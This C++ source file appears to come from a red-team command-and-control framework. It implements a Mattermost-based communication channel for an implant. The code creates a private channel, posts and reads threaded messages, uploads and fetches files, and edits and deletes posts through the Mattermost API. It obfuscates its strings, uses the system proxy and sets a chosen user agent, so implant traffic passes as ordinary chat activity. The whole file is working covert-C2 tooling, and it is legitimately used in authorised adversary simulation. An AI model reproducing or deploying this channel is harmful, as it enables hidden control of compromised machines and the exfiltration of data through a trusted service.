#include "stdafx.h"
#include "MattermostApi.h"
#include "Common/FSecure/CppTools/StringConversions.h"
#include "Common/FSecure/WinHttp/HttpClient.h"
#include "Common/FSecure/WinHttp/Constants.h"
#include "Common/FSecure/WinHttp/Uri.h"
#include <random>
#include <set>
#include <cctype>
#include <algorithm>
#include <sstream>

using namespace FSecure::StringConversions;
using namespace FSecure::WinHttp;

namespace
{
	std::wstring ToWideString(std::string const& str)
	{
		return Convert<Utf16>(str);
	}
}

FSecure::Mattermost::Mattermost(std::string const& serverUrl, std::string const& teamName, std::string const& accessToken, std::string const& channelName, std::string const& userAgent)
{
	if (auto winProxy = WinTools::GetProxyConfiguration(); !winProxy.empty())
		this->m_ProxyConfig = (winProxy == OBF(L"auto")) ? WebProxy(WebProxy::Mode::UseAutoDiscovery) : WebProxy(winProxy);

    this->m_ServerUrl = serverUrl;
	this->m_AccessToken = accessToken;
	this->m_UserAgent = userAgent;

	std::string lowerChannelName = channelName;
	std::transform(lowerChannelName.begin(), lowerChannelName.end(), lowerChannelName.begin(), [](unsigned char c) { return std::tolower(c); });

    SetTeamID(FindTeamID(teamName));
	SetChannel(CreateChannel(lowerChannelName));
}

void FSecure::Mattermost::SetTeamID(std::string const& teamID)
{
    this->m_TeamID = teamID;
}

void FSecure::Mattermost::SetChannel(std::string const& channelId)
{
	this->m_ChannelID = channelId;
}

void FSecure::Mattermost::SetToken(std::string const& accessToken)
{
    this->m_AccessToken = accessToken;
}

std::string FSecure::Mattermost::WritePost(std::string const& message, std::string const& fileID /* = "" */)
{
	return WritePostOrReply(message, fileID);
}

std::string FSecure::Mattermost::WriteReply(std::string const& message, std::string const& postID, std::string const& fileID /* = "" */)
{
    return WritePostOrReply(message, postID, fileID);
}

std::string FSecure::Mattermost::WritePostOrReply(std::string const& message, std::string const& postID /* = "" */, std::string const& fileID /* = "" */)
{
	json j;
	j[OBF("channel_id")] = this->m_ChannelID;
	j[OBF("message")] = message;
	j[OBF("root_id")] = postID;

	if (fileID.empty())
	{
		j[OBF("file_ids")] = std::vector<std::string>();
	}
	else
	{
		j[OBF("file_ids")] = { fileID };
	}

	j[OBF("props")] = std::map<std::string, std::string>();
	
	std::string url = m_ServerUrl + OBF("/api/v4/posts");

	json output = SendJsonRequest(url, j, Method::POST);

	if (output.contains("detailed_error") && output.contains("status_code") && output.value("status_code", 0) == 400)
		return "";

	return output[OBF("id")].get<std::string>();
}

std::string FSecure::Mattermost::FindTeamID(const std::string& teamName)
{
    std::map<std::string, std::string> channelMap;
    std::string url = m_ServerUrl + OBF("/api/v4/teams");

    json response = GetJsonResponse(url);

    for (auto& team : response)
    {
        std::string teamId = team[OBF("id")];
        std::string cName = team[OBF("name")];

        if (cName == teamName)
        {
			return teamId;
        }
    }

	throw std::exception(OBF("[x] Could not find Team specified by ID.\n"));
	return "";
}


std::map<std::string, std::string> FSecure::Mattermost::ListChannels()
{
	std::map<std::string, std::string> channelMap;
	std::string url = m_ServerUrl + OBF("/api/v4/channels?exclude_default_channels=true");

	json response = GetJsonResponse(url);

	for (auto &channel : response)
	{
		std::string teamId = channel[OBF("team_id")];
		std::string cName = channel[OBF("name")];
		std::string cId = channel[OBF("id")].get<std::string>();

		if (teamId != m_TeamID)
		{
			continue;
		}
		
		channelMap.insert({ cName, cId });
	}

	return channelMap;
}



std::string FSecure::Mattermost::CreateChannel(std::string const& channelName)
{
    json j;
    std::string url = m_ServerUrl + OBF("/api/v4/channels");
	j[OBF("team_id")] = this->m_TeamID;
	j[OBF("name")] = channelName;
	j[OBF("display_name")] = channelName;
	j[OBF("purpose")] = "";
	j[OBF("header")] = "";
	j[OBF("type")] = OBF("P");		// O - for public channel, P - for private channel.

	json response = SendJsonRequest(url, j, Method::POST);

	if (response.contains(OBF("status_code")) && response[OBF("status_code")] == 400)
	{
		// channel already exists
		std::map<std::string, std::string> channels = this->ListChannels();

		if (channels.find(channelName) != channels.end())
		{
			return channels[channelName];
		}
		else
		{
			throw std::runtime_error(OBF("Throwing exception: unable to create a channel\n"));
		}
	}
	else
	{
		return response[OBF("id")].get<std::string>();
	}
}


std::vector<std::pair<std::string, std::string>> FSecure::Mattermost::ReadReplies(std::string const& postID)
{
    if (postID.empty())
		return {};

	std::string url = m_ServerUrl + OBF("/api/v4/posts/") + postID + OBF("/thread");
	json output = GetJsonResponse(url);

	//This logic is really messy, in reality the checks are over cautious, however there is an edge case
	//whereby a message could be created with no replies of the implant that wrote triggers an exception or gets killed.
	//If that was the case, and we didn't sanity check, we could run into problems.
	if (!output.contains(OBF("posts")) || !output.contains(OBF("order")))
		return {};

    auto& order = output[OBF("order")].get<std::vector<std::string>>();
	json const& posts = output[OBF("posts")];

	if (posts.empty() || posts.front().value(OBF("reply_count"), 0) == 0)
	{
		return {};
	}

	std::vector<std::pair<std::string, std::string>> ret;
	std::set<std::string> postIDs;

    for (const auto& postID : order)
    {
        json postData = posts[postID];
        std::string_view data = postData[OBF("message")].get<std::string_view>();

		if (!postData.contains(OBF("root_id")) || postData[OBF("root_id")].get<std::string>().empty())
		{
			//skip the first message (parent message) (it doesn't contain the data we want).
			continue;
		}

		if (postIDs.find(postID) != postIDs.end())
		{
			// this element was already appended to the messages list. skip it.
			continue;
		}

		if (postData.contains(OBF("metadata")) && postData[OBF("metadata")].contains(OBF("files")))
		{
			json file = postData[OBF("metadata")][OBF("files")].get<json>();
			if (file.size() > 0)
			{
				std::string fileID = file[0][OBF("id")].get<std::string>();
				std::string text = GetFile(fileID);
				postIDs.insert(postID);
				ret.emplace_back(std::move(postID), std::move(text));
			}
		}
		else
		{
			std::string text = postData[OBF("message")];
			postIDs.insert(postID);
			ret.emplace_back(std::move(postID), std::move(text));
		}
	}

	return ret;
}

std::vector<std::string> FSecure::Mattermost::GetMessagesByDirection(std::string const& direction)
{
	std::vector<std::string> ret;
	std::string cursor;

	std::string url = m_ServerUrl + OBF("/api/v4/channels/") + this->m_ChannelID + OBF("/posts");

	//Actually send the http request and grab the messages
	auto resp = GetJsonResponse(url);

	if (!resp.contains(OBF("posts"))) 
		return {};

	auto& order = resp[OBF("order")].get<std::vector<std::string>>();
    auto& posts = resp[OBF("posts")];
    std::set<std::string> postIDs;

	for (const auto& postID : order)
	{
		json postData = posts[postID];

        std::string_view data = postData[OBF("message")].get<std::string_view>();

        if (postIDs.find(postID) != postIDs.end())
        {
            // this element was already appended to the messages list. skip it.
            continue;
        }

        //make sure it's a message we care about
		if (data == direction)
		{
            ret.emplace_back(postID);
            postIDs.insert(postID);
		}
	}

	return ret;
}

void FSecure::Mattermost::UpdatePost(std::string const& message, std::string const& postID)
{
	if (postID.empty())
		return;

    const std::string url = m_ServerUrl + OBF("/api/v4/posts/") + postID + OBF("/patch");

    json j;
    j[OBF("message")] = message;

    SendJsonRequest(url, j, Method::PUT);
}


void FSecure::Mattermost::DeletePost(std::string const& postID)
{
    if (postID.empty())
        return;

	std::string url = m_ServerUrl + OBF("/api/v4/posts/") + postID;
	SendJsonRequest(url, {}, Method::DEL);
}

FSecure::ByteVector FSecure::Mattermost::SendHttpRequest(std::string const& host, FSecure::WinHttp::Method method, std::optional<WinHttp::ContentType> contentType /* = {} */, std::string const& data /* = "" */)
{
    while (true)
    {
        HttpClient webClient(ToWideString(host), m_ProxyConfig);
        HttpRequest request; // default request is GET

		request.m_Method = method;

        if (!data.empty())
        {
            request.SetData(*contentType, { data.begin(), data.end() });
        }

        request.SetHeader(Header::Authorization, OBF(L"Bearer ") + ToWideString(this->m_AccessToken));
		request.SetHeader(Header::UserAgent, ToWideString(this->m_UserAgent));

        auto resp = webClient.Request(request);

		if (resp.GetStatusCode() == StatusCode::OK || resp.GetStatusCode() == StatusCode::Created)
		{
			return resp.GetData();
		}
		else if (resp.GetStatusCode() == StatusCode::TooManyRequests)
		{
			std::this_thread::sleep_for(Utils::GenerateRandomValue(10s, 20s));
		}
        else if (resp.GetStatusCode() == StatusCode::BadRequest)
        {
			return resp.GetData();
        }
		else
		{
			std::stringstream s;
			json j = json::parse(ByteVector(resp.GetData()));
			s << std::string(OBF("[x] Unexpected response status code returned: HTTP ")) << resp.GetStatusCode() << std::string(OBF(" - JSON: ")) << j << std::endl;
			throw std::exception(s.str().c_str());
		}
    }
}

FSecure::ByteVector FSecure::Mattermost::SendHttpRequest(std::string const& host, std::optional<WinHttp::ContentType> contentType /* = {} */, std::string const& data /* = "" */)
{
	FSecure::WinHttp::Method method = Method::GET;

	if (contentType && !data.empty())
	{
		method = Method::POST;
	}

	return SendHttpRequest(host, method, contentType, data);
}

json FSecure::Mattermost::SendJsonRequest(std::string const& url, json const& data, FSecure::WinHttp::Method method /* Method::GET */)
{
	auto out = json::parse(SendHttpRequest(url, method, ContentType::ApplicationJson, data.dump()));
	return out;
}

json FSecure::Mattermost::GetJsonResponse(std::string const& url)
{
	return json::parse(SendHttpRequest(url));
}

std::string FSecure::Mattermost::UploadFile(ByteView data)
{
	std::string url = m_ServerUrl + OBF("/api/v4/files");

	std::wstring wboundary = FSecure::Utils::GenerateRandomString<std::wstring>(15);
	std::string boundary(wboundary.begin(), wboundary.end());
	std::wstring wcontentType = GetContentType(ContentType::MultipartFormData) + OBF(L"; boundary=----WebKitFormBoundary") + wboundary;
	
    std::string cFilename = FSecure::Utils::GenerateRandomString(16) + "." + FSecure::Utils::GenerateRandomString(3);
    std::string dataString(data.begin(), data.end());

	std::string formData = "";
	formData += OBF("------WebKitFormBoundaryBOUNDARY\r\n");
	formData += OBF("Content-Disposition: form-data; name=\"files\"; filename=\"FILE_NAME\"\r\n");
	formData += OBF("Content-Type: text/plain\r\n\r\n");
	formData += OBF("FILE_DATA\r\n");
	formData += OBF("------WebKitFormBoundaryBOUNDARY\r\n");
	formData += OBF("Content-Disposition: form-data; name=\"channel_id\"\r\n\r\n");
	formData += OBF("CHANNEL_ID\r\n");
	formData += OBF("------WebKitFormBoundaryBOUNDARY--\r\n");

	formData = FSecure::Utils::ReplaceString(formData, std::string(OBF("FILE_NAME")), cFilename);
	formData = FSecure::Utils::ReplaceString(formData, std::string(OBF("CHANNEL_ID")), m_ChannelID);
	formData = FSecure::Utils::ReplaceString(formData, std::string(OBF("BOUNDARY")), boundary);
	formData = FSecure::Utils::ReplaceString(formData, std::string(OBF("FILE_DATA")), dataString);

	ByteView rawData(formData.data());
	
    while (true)
    {
        HttpClient webClient(ToWideString(url), m_ProxyConfig);
        HttpRequest request;

		request.m_Method = Method::POST;

        request.SetData(wcontentType, { rawData.begin(), rawData.end() });
        request.SetHeader(Header::Authorization, OBF(L"Bearer ") + ToWideString(this->m_AccessToken));
		request.SetHeader(Header::UserAgent, ToWideString(this->m_UserAgent));

        auto resp = webClient.Request(request);

		if (resp.GetStatusCode() == StatusCode::OK || resp.GetStatusCode() == StatusCode::Created)
		{
			auto out = json::parse(ByteVector(resp.GetData()));
			return out[OBF("file_infos")][0][OBF("id")];
		}
		else if (resp.GetStatusCode() == StatusCode::TooManyRequests)
		{
			std::this_thread::sleep_for(Utils::GenerateRandomValue(10s, 20s));
		}
		else
		{
            std::stringstream s;
            json j = json::parse(ByteVector(resp.GetData()));
            s << std::string(OBF("[x] Unexpected response status code returned while uploading file: HTTP ")) << resp.GetStatusCode() << std::string(OBF(" - JSON: ")) << j << std::endl;
            throw std::exception(s.str().c_str());
		}
    }

	return "";
}


std::string FSecure::Mattermost::GetFile(std::string const& fileID)
{
	std::string url = m_ServerUrl + OBF("/api/v4/files/") + fileID + OBF("/link");
	auto out = GetJsonResponse(url);

	if (!out.contains(OBF("link")))
		return {};

	std::string fileUrl = out[OBF("link")];
	auto data = SendHttpRequest(fileUrl);
	return { data.begin(), data.end() };
}
